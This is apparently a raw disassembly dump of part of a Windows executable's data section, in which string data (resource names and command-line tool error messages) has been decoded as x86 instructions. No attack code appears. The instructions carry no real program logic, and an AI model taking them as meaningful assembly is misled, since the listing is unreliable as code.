  4046a7:	dec    esp
  4046a8:	add    BYTE PTR [ecx+0x0],ah
  4046ab:	outs   dx,BYTE PTR ds:[esi]
  4046ac:	add    BYTE PTR [edi+0x0],ah
  4046af:	push   eax
  4046b0:	add    BYTE PTR [ecx+0x0],ah
  4046b3:	jb     0x4046b5
  4046b5:	popa   
  4046b6:	add    BYTE PTR [ebp+0x0],ch
  4046b9:	outs   dx,DWORD PTR ds:[esi]
  4046ba:	add    BYTE PTR [eax],al
  4046bc:	add    BYTE PTR [esi+ecx*2],bl
  4046bf:	add    BYTE PTR [edi+0x0],ch
  4046c2:	dec    ebp
  4046c3:	add    BYTE PTR [ebp+0x0],dh
  4046c6:	ins    BYTE PTR es:[edi],dx
  4046c7:	add    BYTE PTR [eax+eax*1+0x41],dh
  4046cb:	add    BYTE PTR [ebx+0x0],dh
  4046ce:	jae    0x4046d0
  4046d0:	add    BYTE PTR gs:[ebp+0x0],ch
  4046d4:	bound  eax,QWORD PTR [eax]
  4046d6:	ins    BYTE PTR es:[edi],dx
  4046d7:	add    BYTE PTR [ecx+0x0],bh
  4046da:	mov    ds:0x28000000,al
  4046df:	dec    esi
  4046e0:	add    BYTE PTR [edi+0x0],ch
  4046e3:	dec    esi
  4046e4:	add    BYTE PTR [ecx+0x0],ah
  4046e7:	ins    DWORD PTR es:[edi],dx
  4046e8:	add    BYTE PTR [ebp+0x0],ah
  4046eb:	jae    0x4046ed
  4046ed:	jo     0x4046ef
  4046ef:	popa   
  4046f0:	add    BYTE PTR [ebx+0x0],ah
  4046f3:	add    BYTE PTR gs:[eax+0x0],dl
  4046f7:	popa   
  4046f8:	add    BYTE PTR [edx+0x0],dh
  4046fb:	popa   
  4046fc:	add    BYTE PTR [ebp+0x0],ch
  4046ff:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  404704:	add    BYTE PTR [edx+0x0],dh
  404707:	xlat   BYTE PTR ds:[ebx]
  404708:	add    BYTE PTR [eax],al
  40470a:	add    BYTE PTR [esi+ecx*2],dl
  40470d:	add    BYTE PTR [edi+0x0],ch
  404710:	dec    edi
  404711:	add    BYTE PTR [ebp+0x0],dh
  404714:	je     0x404716
  404716:	push   eax
  404717:	add    BYTE PTR [ecx+0x0],ah
  40471a:	jb     0x40471c
  40471c:	popa   
  40471d:	add    BYTE PTR [ebp+0x0],ch
  404720:	pop    es
  404721:	add    DWORD PTR [eax],eax
  404723:	add    BYTE PTR [esi],ah
  404725:	push   esp
  404726:	add    BYTE PTR [edi+0x0],ch
  404729:	outs   dx,DWORD PTR ds:[esi]
  40472a:	add    BYTE PTR [ebp+0x0],cl
  40472d:	popa   
  40472e:	add    BYTE PTR [esi+0x0],ch
  404731:	jns    0x404733
  404733:	inc    ebx
  404734:	add    BYTE PTR [edi+0x0],ch
  404737:	ins    BYTE PTR es:[edi],dx
  404738:	add    BYTE PTR [eax+eax*1+0x61],ch
  40473c:	add    BYTE PTR [eax+0x0],dh
  40473f:	jae    0x404741
  404741:	add    BYTE PTR gs:[ecx+0x0],al
  404745:	jb     0x404747
  404747:	add    BYTE PTR [bp+di+0x0],dh
  40474b:	xor    DWORD PTR [ecx],eax
  40474d:	add    BYTE PTR [eax],al
  40474f:	sbb    dl,BYTE PTR [eax+eax*1+0x6f]
  404753:	add    BYTE PTR [edi+0x0],ch
  404756:	dec    ebp
  404757:	add    BYTE PTR [ecx+0x0],ah
  40475a:	outs   dx,BYTE PTR ds:[esi]
  40475b:	add    BYTE PTR [ecx+0x0],bh
  40475e:	push   ebx
  40475f:	add    BYTE PTR [ebp+0x0],ah
  404762:	outs   dx,BYTE PTR ds:[esi]
  404763:	add    BYTE PTR [eax+eax*1+0x65],ah
  404767:	add    BYTE PTR [edx+0x0],dh
  40476a:	add    DWORD PTR [ecx],0x551e0000
  404770:	add    BYTE PTR [esi+0x0],ch
  404773:	imul   eax,DWORD PTR [eax],0x6e
  404776:	add    BYTE PTR [edi+0x0],ch
  404779:	ja     0x40477b
  40477b:	outs   dx,BYTE PTR ds:[esi]
  40477c:	add    BYTE PTR [eax+eax*1+0x61],cl
  404780:	add    BYTE PTR [esi+0x0],ch
  404783:	add    BYTE PTR [di+0x0],dh
  404787:	popa   
  404788:	add    BYTE PTR [edi+0x0],ah
  40478b:	gs add dl,dl
  40478e:	add    DWORD PTR [eax],eax
  404790:	add    BYTE PTR [eax],ah
  404792:	push   ebp
  404793:	add    BYTE PTR [esi+0x0],ch
  404796:	imul   eax,DWORD PTR [eax],0x6e
  404799:	add    BYTE PTR [edi+0x0],ch
  40479c:	ja     0x40479e
  40479e:	outs   dx,BYTE PTR ds:[esi]
  40479f:	add    BYTE PTR [eax+0x0],dl
  4047a2:	popa   
  4047a3:	add    BYTE PTR [edx+0x0],dh
  4047a6:	popa   
  4047a7:	add    BYTE PTR [ebp+0x0],ch
  4047aa:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  4047af:	add    BYTE PTR [edx+0x0],dh
  4047b2:	in     eax,dx
  4047b3:	add    DWORD PTR [eax],eax
  4047b5:	add    BYTE PTR [edx],ah
  4047b7:	push   edi
  4047b8:	add    BYTE PTR [ebx+0x0],ah
  4047bb:	popa   
  4047bc:	add    BYTE PTR [eax+0x0],cl
  4047bf:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4047c4:	add    BYTE PTR [ecx+0x0],al
  4047c7:	jb     0x4047c9
  4047c9:	add    BYTE PTR [di+0x0],dh
  4047cd:	ins    DWORD PTR es:[edi],dx
  4047ce:	add    BYTE PTR [ebp+0x0],ah
  4047d1:	outs   dx,BYTE PTR ds:[esi]
  4047d2:	add    BYTE PTR [eax+eax*1+0x73],dh
  4047d6:	add    BYTE PTR [ecx],dh
  4047d8:	add    BYTE PTR [edi],al
  4047da:	add    al,BYTE PTR [eax]
  4047dc:	add    BYTE PTR [edx],ah
  4047de:	push   edi
  4047df:	add    BYTE PTR [ebx+0x0],ah
  4047e2:	popa   
  4047e3:	add    BYTE PTR [eax+0x0],cl
  4047e6:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4047eb:	add    BYTE PTR [ecx+0x0],al
  4047ee:	jb     0x4047f0
  4047f0:	add    BYTE PTR [di+0x0],dh
  4047f4:	ins    DWORD PTR es:[edi],dx
  4047f5:	add    BYTE PTR [ebp+0x0],ah
  4047f8:	outs   dx,BYTE PTR ds:[esi]
  4047f9:	add    BYTE PTR [eax+eax*1+0x73],dh
  4047fd:	add    BYTE PTR [edx],dh
  4047ff:	add    BYTE PTR [esi],ah
  404801:	add    al,BYTE PTR [eax]
  404803:	add    BYTE PTR [edx],ah
  404805:	push   edi
  404806:	add    BYTE PTR [ebx+0x0],ah
  404809:	popa   
  40480a:	add    BYTE PTR [eax+0x0],cl
  40480d:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404812:	add    BYTE PTR [ecx+0x0],al
  404815:	jb     0x404817
  404817:	add    BYTE PTR [di+0x0],dh
  40481b:	ins    DWORD PTR es:[edi],dx
  40481c:	add    BYTE PTR [ebp+0x0],ah
  40481f:	outs   dx,BYTE PTR ds:[esi]
  404820:	add    BYTE PTR [eax+eax*1+0x73],dh
  404824:	add    BYTE PTR [ebx],dh
  404826:	add    BYTE PTR [ebx],bh
  404828:	add    al,BYTE PTR [eax]
  40482a:	add    BYTE PTR [edx],bl
  40482c:	push   edi
  40482d:	add    BYTE PTR [ebx+0x0],ah
  404830:	popa   
  404831:	add    BYTE PTR [eax+0x0],cl
  404834:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404839:	add    BYTE PTR [ecx+0x0],cl
  40483c:	outs   dx,BYTE PTR ds:[esi]
  40483d:	add    BYTE PTR [eax+eax*1+0x72],dh
  404841:	add    BYTE PTR [edi+0x0],ch
  404844:	xor    DWORD PTR [eax],eax
  404846:	xchg   BYTE PTR [edx],al
  404848:	add    BYTE PTR [eax],al
  40484a:	sbb    dl,BYTE PTR [edi+0x0]
  40484d:	arpl   WORD PTR [eax],ax
  40484f:	popa   
  404850:	add    BYTE PTR [eax+0x0],cl
  404853:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404858:	add    BYTE PTR [ecx+0x0],cl
  40485b:	outs   dx,BYTE PTR ds:[esi]
  40485c:	add    BYTE PTR [eax+eax*1+0x72],dh
  404860:	add    BYTE PTR [edi+0x0],ch
  404863:	xor    al,BYTE PTR [eax]
  404865:	enter  0x2,0x0
  404869:	sbb    dl,BYTE PTR [edi+0x0]
  40486c:	arpl   WORD PTR [eax],ax
  40486e:	popa   
  40486f:	add    BYTE PTR [eax+0x0],cl
  404872:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404877:	add    BYTE PTR [ecx+0x0],cl
  40487a:	outs   dx,BYTE PTR ds:[esi]
  40487b:	add    BYTE PTR [eax+eax*1+0x72],dh
  40487f:	add    BYTE PTR [edi+0x0],ch
  404882:	xor    eax,DWORD PTR [eax]
  404884:	hlt    
  404885:	add    al,BYTE PTR [eax]
  404887:	add    BYTE PTR [eax],ah
  404889:	push   edi
  40488a:	add    BYTE PTR [ebx+0x0],ah
  40488d:	popa   
  40488e:	add    BYTE PTR [eax+0x0],cl
  404891:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404896:	add    BYTE PTR [edi+0x0],cl
  404899:	jo     0x40489b
  40489b:	je     0x40489d
  40489d:	imul   eax,DWORD PTR [eax],0x6e006f
  4048a3:	jae    0x4048a5
  4048a5:	xor    BYTE PTR [eax],al
  4048a7:	xor    DWORD PTR [eax],eax
  4048a9:	das    
  4048aa:	add    eax,DWORD PTR [eax]
  4048ac:	add    BYTE PTR [eax],ah
  4048ae:	push   edi
  4048af:	add    BYTE PTR [ebx+0x0],ah
  4048b2:	popa   
  4048b3:	add    BYTE PTR [eax+0x0],cl
  4048b6:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4048bb:	add    BYTE PTR [edi+0x0],cl
  4048be:	jo     0x4048c0
  4048c0:	je     0x4048c2
  4048c2:	imul   eax,DWORD PTR [eax],0x6e006f
  4048c8:	jae    0x4048ca
  4048ca:	xor    BYTE PTR [eax],al
  4048cc:	xor    al,BYTE PTR [eax]
  4048ce:	dec    esp
  4048cf:	add    eax,DWORD PTR [eax]
  4048d1:	add    BYTE PTR [eax],ah
  4048d3:	push   edi
  4048d4:	add    BYTE PTR [ebx+0x0],ah
  4048d7:	popa   
  4048d8:	add    BYTE PTR [eax+0x0],cl
  4048db:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4048e0:	add    BYTE PTR [edi+0x0],cl
  4048e3:	jo     0x4048e5
  4048e5:	je     0x4048e7
  4048e7:	imul   eax,DWORD PTR [eax],0x6e006f
  4048ed:	jae    0x4048ef
  4048ef:	xor    BYTE PTR [eax],al
  4048f1:	xor    eax,DWORD PTR [eax]
  4048f3:	pop    ebx
  4048f4:	add    eax,DWORD PTR [eax]
  4048f6:	add    BYTE PTR [eax],ah
  4048f8:	push   edi
  4048f9:	add    BYTE PTR [ebx+0x0],ah
  4048fc:	popa   
  4048fd:	add    BYTE PTR [eax+0x0],cl
  404900:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404905:	add    BYTE PTR [edi+0x0],cl
  404908:	jo     0x40490a
  40490a:	je     0x40490c
  40490c:	imul   eax,DWORD PTR [eax],0x6e006f
  404912:	jae    0x404914
  404914:	xor    BYTE PTR [eax],al
  404916:	xor    al,0x0
  404918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404919:	add    eax,DWORD PTR [eax]
  40491b:	add    BYTE PTR [eax],ah
  40491d:	push   edi
  40491e:	add    BYTE PTR [ebx+0x0],ah
  404921:	popa   
  404922:	add    BYTE PTR [eax+0x0],cl
  404925:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40492a:	add    BYTE PTR [edi+0x0],cl
  40492d:	jo     0x40492f
  40492f:	je     0x404931
  404931:	imul   eax,DWORD PTR [eax],0x6e006f
  404937:	jae    0x404939
  404939:	xor    BYTE PTR [eax],al
  40493b:	xor    eax,0x3e700
  404940:	add    BYTE PTR [eax],ah
  404942:	push   edi
  404943:	add    BYTE PTR [ebx+0x0],ah
  404946:	popa   
  404947:	add    BYTE PTR [eax+0x0],cl
  40494a:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40494f:	add    BYTE PTR [edi+0x0],cl
  404952:	jo     0x404954
  404954:	je     0x404956
  404956:	imul   eax,DWORD PTR [eax],0x6e006f
  40495c:	jae    0x40495e
  40495e:	xor    BYTE PTR [eax],al
  404960:	add    BYTE PTR ss:0x20000004,dh
  404967:	push   edi
  404968:	add    BYTE PTR [ebx+0x0],ah
  40496b:	popa   
  40496c:	add    BYTE PTR [eax+0x0],cl
  40496f:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404974:	add    BYTE PTR [edi+0x0],cl
  404977:	jo     0x404979
  404979:	je     0x40497b
  40497b:	imul   eax,DWORD PTR [eax],0x6e006f
  404981:	jae    0x404983
  404983:	xor    BYTE PTR [eax],al
  404985:	aaa    
  404986:	add    BYTE PTR [esi+0x4],bl
  404989:	add    BYTE PTR [eax],al
  40498b:	and    BYTE PTR [edi+0x0],dl
  40498e:	arpl   WORD PTR [eax],ax
  404990:	popa   
  404991:	add    BYTE PTR [eax+0x0],cl
  404994:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404999:	add    BYTE PTR [edi+0x0],cl
  40499c:	jo     0x40499e
  40499e:	je     0x4049a0
  4049a0:	imul   eax,DWORD PTR [eax],0x6e006f
  4049a6:	jae    0x4049a8
  4049a8:	xor    BYTE PTR [eax],al
  4049aa:	cmp    BYTE PTR [eax],al
  4049ac:	outs   dx,BYTE PTR ds:[esi]
  4049ad:	add    al,0x0
  4049af:	add    BYTE PTR [eax],ah
  4049b1:	push   edi
  4049b2:	add    BYTE PTR [ebx+0x0],ah
  4049b5:	popa   
  4049b6:	add    BYTE PTR [eax+0x0],cl
  4049b9:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4049be:	add    BYTE PTR [edi+0x0],cl
  4049c1:	jo     0x4049c3
  4049c3:	je     0x4049c5
  4049c5:	imul   eax,DWORD PTR [eax],0x6e006f
  4049cb:	jae    0x4049cd
  4049cd:	xor    BYTE PTR [eax],al
  4049cf:	cmp    DWORD PTR [eax],eax
  4049d1:	mov    edi,0x20000004
  4049d6:	push   edi
  4049d7:	add    BYTE PTR [ebx+0x0],ah
  4049da:	popa   
  4049db:	add    BYTE PTR [eax+0x0],cl
  4049de:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4049e3:	add    BYTE PTR [edi+0x0],cl
  4049e6:	jo     0x4049e8
  4049e8:	je     0x4049ea
  4049ea:	imul   eax,DWORD PTR [eax],0x6e006f
  4049f0:	jae    0x4049f2
  4049f2:	xor    DWORD PTR [eax],eax
  4049f4:	xor    BYTE PTR [eax],al
  4049f6:	or     BYTE PTR ds:0x57200000,al
  4049fc:	add    BYTE PTR [ebx+0x0],ah
  4049ff:	popa   
  404a00:	add    BYTE PTR [eax+0x0],cl
  404a03:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404a08:	add    BYTE PTR [edi+0x0],cl
  404a0b:	jo     0x404a0d
  404a0d:	je     0x404a0f
  404a0f:	imul   eax,DWORD PTR [eax],0x6e006f
  404a15:	jae    0x404a17
  404a17:	xor    DWORD PTR [eax],eax
  404a19:	xor    DWORD PTR [eax],eax
  404a1b:	push   ds
  404a1c:	add    eax,0x57200000
  404a21:	add    BYTE PTR [ebx+0x0],ah
  404a24:	popa   
  404a25:	add    BYTE PTR [eax+0x0],cl
  404a28:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404a2d:	add    BYTE PTR [edi+0x0],cl
  404a30:	jo     0x404a32
  404a32:	je     0x404a34
  404a34:	imul   eax,DWORD PTR [eax],0x6e006f
  404a3a:	jae    0x404a3c
  404a3c:	xor    DWORD PTR [eax],eax
  404a3e:	xor    al,BYTE PTR [eax]
  404a40:	push   0x5
  404a42:	add    BYTE PTR [eax],al
  404a44:	and    BYTE PTR [edi+0x0],dl
  404a47:	arpl   WORD PTR [eax],ax
  404a49:	popa   
  404a4a:	add    BYTE PTR [eax+0x0],cl
  404a4d:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404a52:	add    BYTE PTR [edi+0x0],cl
  404a55:	jo     0x404a57
  404a57:	je     0x404a59
  404a59:	imul   eax,DWORD PTR [eax],0x6e006f
  404a5f:	jae    0x404a61
  404a61:	xor    DWORD PTR [eax],eax
  404a63:	xor    eax,DWORD PTR [eax]
  404a65:	xchg   esi,eax
  404a66:	add    eax,0x57200000
  404a6b:	add    BYTE PTR [ebx+0x0],ah
  404a6e:	popa   
  404a6f:	add    BYTE PTR [eax+0x0],cl
  404a72:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404a77:	add    BYTE PTR [edi+0x0],cl
  404a7a:	jo     0x404a7c
  404a7c:	je     0x404a7e
  404a7e:	imul   eax,DWORD PTR [eax],0x6e006f
  404a84:	jae    0x404a86
  404a86:	xor    DWORD PTR [eax],eax
  404a88:	xor    al,0x0
  404a8a:	lods   al,BYTE PTR ds:[esi]
  404a8b:	add    eax,0x57200000
  404a90:	add    BYTE PTR [ebx+0x0],ah
  404a93:	popa   
  404a94:	add    BYTE PTR [eax+0x0],cl
  404a97:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404a9c:	add    BYTE PTR [edi+0x0],cl
  404a9f:	jo     0x404aa1
  404aa1:	je     0x404aa3
  404aa3:	imul   eax,DWORD PTR [eax],0x6e006f
  404aa9:	jae    0x404aab
  404aab:	xor    DWORD PTR [eax],eax
  404aad:	xor    eax,0x5fc00
  404ab2:	add    BYTE PTR [eax],ah
  404ab4:	push   edi
  404ab5:	add    BYTE PTR [ebx+0x0],ah
  404ab8:	popa   
  404ab9:	add    BYTE PTR [eax+0x0],cl
  404abc:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404ac1:	add    BYTE PTR [edi+0x0],cl
  404ac4:	jo     0x404ac6
  404ac6:	je     0x404ac8
  404ac8:	imul   eax,DWORD PTR [eax],0x6e006f
  404ace:	jae    0x404ad0
  404ad0:	xor    DWORD PTR [eax],eax
  404ad2:	add    BYTE PTR ss:[edx],ah
  404ad5:	push   es
  404ad6:	add    BYTE PTR [eax],al
  404ad8:	and    BYTE PTR [edi+0x0],dl
  404adb:	arpl   WORD PTR [eax],ax
  404add:	popa   
  404ade:	add    BYTE PTR [eax+0x0],cl
  404ae1:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404ae6:	add    BYTE PTR [edi+0x0],cl
  404ae9:	jo     0x404aeb
  404aeb:	je     0x404aed
  404aed:	imul   eax,DWORD PTR [eax],0x6e006f
  404af3:	jae    0x404af5
  404af5:	xor    DWORD PTR [eax],eax
  404af7:	aaa    
  404af8:	add    BYTE PTR [edx],bh
  404afa:	push   es
  404afb:	add    BYTE PTR [eax],al
  404afd:	and    BYTE PTR [edi+0x0],dl
  404b00:	arpl   WORD PTR [eax],ax
  404b02:	popa   
  404b03:	add    BYTE PTR [eax+0x0],cl
  404b06:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404b0b:	add    BYTE PTR [edi+0x0],cl
  404b0e:	jo     0x404b10
  404b10:	je     0x404b12
  404b12:	imul   eax,DWORD PTR [eax],0x6e006f
  404b18:	jae    0x404b1a
  404b1a:	xor    DWORD PTR [eax],eax
  404b1c:	cmp    BYTE PTR [eax],al
  404b1e:	mov    BYTE PTR [esi],al
  404b20:	add    BYTE PTR [eax],al
  404b22:	sbb    dl,BYTE PTR [edi+0x0]
  404b25:	arpl   WORD PTR [eax],ax
  404b27:	popa   
  404b28:	add    BYTE PTR [eax+0x0],cl
  404b2b:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404b30:	add    BYTE PTR [ebp+0x0],dl
  404b33:	jae    0x404b35
  404b35:	popa   
  404b36:	add    BYTE PTR [edi+0x0],ah
  404b39:	add    BYTE PTR gs:[ecx],dh
  404b3c:	add    ch,cl
  404b3e:	push   es
  404b3f:	add    BYTE PTR [eax],al
  404b41:	sbb    dl,BYTE PTR [edi+0x0]
  404b44:	arpl   WORD PTR [eax],ax
  404b46:	popa   
  404b47:	add    BYTE PTR [eax+0x0],cl
  404b4a:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404b4f:	add    BYTE PTR [ebp+0x0],dl
  404b52:	jae    0x404b54
  404b54:	popa   
  404b55:	add    BYTE PTR [edi+0x0],ah
  404b58:	add    BYTE PTR gs:[edx],dh
  404b5b:	add    al,bl
  404b5d:	push   es
  404b5e:	add    BYTE PTR [eax],al
  404b60:	sbb    dl,BYTE PTR [edi+0x0]
  404b63:	arpl   WORD PTR [eax],ax
  404b65:	popa   
  404b66:	add    BYTE PTR [eax+0x0],cl
  404b69:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404b6e:	add    BYTE PTR [ebp+0x0],dl
  404b71:	jae    0x404b73
  404b73:	popa   
  404b74:	add    BYTE PTR [edi+0x0],ah
  404b77:	add    BYTE PTR gs:[ebx],dh
  404b7a:	add    BYTE PTR [eax],ah
  404b7c:	pop    es
  404b7d:	add    BYTE PTR [eax],al
  404b7f:	sbb    dl,BYTE PTR [edi+0x0]
  404b82:	arpl   WORD PTR [eax],ax
  404b84:	popa   
  404b85:	add    BYTE PTR [eax+0x0],cl
  404b88:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404b8d:	add    BYTE PTR [ebp+0x0],dl
  404b90:	jae    0x404b92
  404b92:	popa   
  404b93:	add    BYTE PTR [edi+0x0],ah
  404b96:	add    BYTE PTR gs:[eax+eax*1],dh
  404b9a:	das    
  404b9b:	pop    es
  404b9c:	add    BYTE PTR [eax],al
  404b9e:	sbb    dl,BYTE PTR [edi+0x0]
  404ba1:	jb     0x404ba3
  404ba3:	outs   dx,DWORD PTR ds:[esi]
  404ba4:	add    BYTE PTR [esi+0x0],ch
  404ba7:	add    BYTE PTR [bx+di+0x0],al
  404bab:	jb     0x404bad
  404bad:	add    BYTE PTR [bp+di+0x0],al
  404bb1:	outs   dx,DWORD PTR ds:[esi]
  404bb2:	add    BYTE PTR [ebp+0x0],dh
  404bb5:	outs   dx,BYTE PTR ds:[esi]
  404bb6:	add    BYTE PTR [eax+eax*1+0x62],dh
  404bba:	pop    es
  404bbb:	add    BYTE PTR [eax],al
  404bbd:	add    DWORD PTR [eax],edi
  404bbf:	inc    esp
  404bc0:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  404bc7:	jns    0x404be9
  404bc9:	daa    
  404bca:	jnp    0x404bfc
  404bcc:	jge    0x404bf5
  404bce:	and    BYTE PTR [edi+ebp*2+0x65],ah
  404bd2:	jae    0x404bf4
  404bd4:	outs   dx,BYTE PTR ds:[esi]
  404bd5:	outs   dx,DWORD PTR ds:[esi]
  404bd6:	je     0x404bf8
  404bd8:	gs js  0x404c44
  404bdb:	jae    0x404c51
  404bdd:	and    BYTE PTR cs:[eax],ah
  404be0:	push   eax
  404be1:	ins    BYTE PTR es:[edi],dx
  404be2:	gs popa 
  404be4:	jae    0x404c4b
  404be6:	and    BYTE PTR [ebx+0x72],ah
  404be9:	gs popa 
  404beb:	je     0x404c52
  404bed:	and    BYTE PTR [ecx+0x74],ch
  404bf0:	and    BYTE PTR [esi+0x69],ah
  404bf3:	jb     0x404c68
  404bf5:	je     0x404c25
  404bf7:	add    DWORD PTR [ebx],esi
  404bf9:	push   esp
  404bfa:	push   0x616c2065
  404bff:	outs   dx,BYTE PTR ds:[esi]
  404c00:	addr16 jne 0x404c64
  404c03:	and    BYTE PTR gs:[bx],ah
  404c07:	jnp    0x404c39
  404c09:	jge    0x404c32
  404c0b:	and    BYTE PTR [ecx+0x73],ch
  404c0e:	and    BYTE PTR [esi+0x6f],ch
  404c11:	je     0x404c33
  404c13:	popa   
  404c14:	and    BYTE PTR [esi+0x61],dh
  404c17:	ins    BYTE PTR es:[edi],dx
  404c18:	imul   esp,DWORD PTR [eax+eiz*1+0x43],0x4465646f
  404c20:	outs   dx,DWORD PTR ds:[esi]
  404c21:	ins    DWORD PTR es:[edi],dx
  404c22:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  404c26:	addr16 jne 0x404c8a
  404c29:	gs add DWORD PTR cs:[bx+di],esi
  404c2e:	das    
  404c2f:	ins    BYTE PTR es:[edi],dx
  404c30:	popa   
  404c31:	outs   dx,BYTE PTR ds:[esi]
  404c32:	addr16 jne 0x404c96
  404c35:	and    BYTE PTR gs:[si+0x69],ah
  404c3a:	and    BYTE PTR fs:[esi+0x6f],ch
  404c3e:	je     0x404c60
  404c40:	push   0x20657661
  404c45:	popa   
  404c46:	and    BYTE PTR [ebx+0x6f],ah
  404c49:	fs and BYTE PTR gs:[ecx+eiz*2+0x6e],ch
  404c4f:	addr16 jne 0x404cb3
  404c52:	and    BYTE PTR gs:[bx+si+0x61],dh
  404c57:	jb     0x404cba
  404c59:	ins    DWORD PTR es:[edi],dx
  404c5a:	gs je  0x404cc2
  404c5d:	jb     0x404c8d
  404c5f:	add    DWORD PTR [ebx],esi
  404c61:	inc    ebx
  404c62:	popa   
  404c63:	outs   dx,BYTE PTR ds:[esi]
  404c64:	outs   dx,BYTE PTR ds:[esi]
  404c65:	outs   dx,DWORD PTR ds:[esi]
  404c66:	je     0x404c88
  404c68:	jae    0x404cda
  404c6a:	arpl   WORD PTR gs:[ecx+0x66],bp
  404c6e:	jns    0x404c90
  404c70:	ins    DWORD PTR es:[edi],dx
  404c71:	jne    0x404cdf
  404c73:	je     0x404cde
  404c75:	jo     0x404ce3
  404c77:	and    BYTE PTR gs:[ecx+0x73],ah
  404c7b:	jae    0x404ce2
  404c7d:	ins    DWORD PTR es:[edi],dx
  404c7e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x73]
  404c82:	and    BYTE PTR [ecx+0x74],ah
  404c85:	and    BYTE PTR [eax+ebp*2+0x65],dh
  404c89:	and    BYTE PTR [ebx+0x61],dh
  404c8c:	ins    DWORD PTR es:[edi],dx
  404c8d:	and    BYTE PTR gs:[ecx+ebp*2+0x6d],dh
  404c92:	gs add DWORD PTR cs:[esi],ebp
  404c96:	das    
  404c97:	outs   dx,BYTE PTR ds:[esi]
  404c98:	popa   
  404c99:	ins    DWORD PTR es:[edi],dx
  404c9a:	gs jae 0x404d0d
  404c9d:	popa   
  404c9e:	arpl   WORD PTR [ebp+0x20],sp
  404ca1:	imul   esp,DWORD PTR fs:[eax+eiz*1+0x6e],0x6820746f
  404caa:	popa   
  404cab:	jbe    0x404d12
  404cad:	and    BYTE PTR [ecx+0x20],ah
  404cb0:	outs   dx,BYTE PTR ds:[esi]
  404cb1:	popa   
  404cb2:	ins    DWORD PTR es:[edi],dx
  404cb3:	gs jae 0x404d26
  404cb6:	popa   
  404cb7:	arpl   WORD PTR [ebp+0x20],sp
  404cba:	jo     0x404d1d
  404cbc:	jb     0x404d1f
  404cbe:	ins    DWORD PTR es:[edi],dx
  404cbf:	gs je  0x404d27
  404cc2:	jb     0x404cf2
  404cc4:	add    DWORD PTR [eax],ebp
  404cc6:	das    
  404cc7:	outs   dx,DWORD PTR ds:[esi]
  404cc8:	jne    0x404d3e
  404cca:	and    BYTE PTR [ecx+ebp*2+0x64],ah
  404cce:	and    BYTE PTR [esi+0x6f],ch
  404cd1:	je     0x404cf3
  404cd3:	push   0x20657661
  404cd8:	popa   
  404cd9:	and    BYTE PTR [ecx+ebp*2+0x72],ah
  404cdd:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  404ce2:	jns    0x404d04
  404ce4:	jo     0x404d47
  404ce6:	jb     0x404d49
  404ce8:	ins    DWORD PTR es:[edi],dx
  404ce9:	gs je  0x404d51
  404cec:	jb     0x404d1c
  404cee:	add    DWORD PTR [esi+0x2f],ecx
  404cf1:	arpl   WORD PTR [edi+0x6c],bp
  404cf4:	ins    BYTE PTR es:[edi],dx
  404cf5:	popa   
  404cf6:	jo     0x404d6b
  404cf8:	gs inc ecx
  404cfa:	jb     0x404d63
  404cfc:	jae    0x404d1e
  404cfe:	outs   dx,DWORD PTR ds:[esi]
  404cff:	jo     0x404d75
  404d01:	imul   ebp,DWORD PTR [edi+0x6e],0x70706120
  404d08:	gs popa 
  404d0a:	jb     0x404d71
  404d0c:	and    BYTE PTR fs:[edi+esi*2+0x69],dh
  404d11:	arpl   WORD PTR [ebp+0x20],sp
  404d14:	imul   ebp,DWORD PTR [esi+0x20],0x75677261
  404d1b:	ins    DWORD PTR es:[edi],dx
  404d1c:	outs   dx,BYTE PTR gs:[esi]
  404d1e:	je     0x404d40
  404d20:	ins    BYTE PTR es:[edi],dx
  404d21:	imul   esi,DWORD PTR [ebx+0x74],0x646e6120
  404d28:	and    BYTE PTR [ebp+0x61],ch
  404d2b:	jns    0x404d4d
  404d2d:	outs   dx,DWORD PTR ds:[esi]
  404d2e:	outs   dx,BYTE PTR ds:[esi]
  404d2f:	ins    BYTE PTR es:[edi],dx
  404d30:	jns    0x404d52
  404d32:	popa   
  404d33:	jo     0x404da5
  404d35:	gs popa 
  404d37:	jb     0x404d59
  404d39:	outs   dx,DWORD PTR ds:[esi]
  404d3a:	outs   dx,BYTE PTR ds:[esi]
  404d3b:	arpl   WORD PTR [ebp+0x2e],sp
  404d3e:	add    DWORD PTR [edi+0x2f],ecx
  404d41:	imul   ebp,DWORD PTR [esi+0x63],0x6564756c
  404d48:	push   ebx
  404d49:	outs   dx,BYTE PTR gs:[esi]
  404d4b:	fs gs jb 0x404d6f
  404d4f:	outs   dx,DWORD PTR ds:[esi]
  404d50:	jo     0x404dc6
  404d52:	imul   ebp,DWORD PTR [edi+0x6e],0x70706120
